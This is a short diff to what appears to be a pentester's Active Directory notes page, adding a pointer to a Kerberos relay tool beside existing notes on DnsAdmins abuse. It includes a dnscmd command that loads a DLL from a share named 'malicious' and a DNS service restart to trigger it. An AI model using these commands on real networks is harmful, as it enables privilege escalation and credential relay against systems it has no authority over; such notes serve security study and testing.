@@ -86,6 +86,7 @@ pagetitle: Active Directory Information
 			- Can perform dll hijacking to priv esc
 			- `dnscmd /config /serverlevelplugindll \\malicious\share\malicious.dll`
 			- DLL will execute on next DNS restart (we can `sc {stop/start} dns`)
+			- Can also use [KrbRelayEx](https://github.com/decoder-it/KrbRelayEx) to relay Kerberos AP-REQ tickets to SMB shares/ADCS endpoints
 
 
 ## Enumeration with PowerView
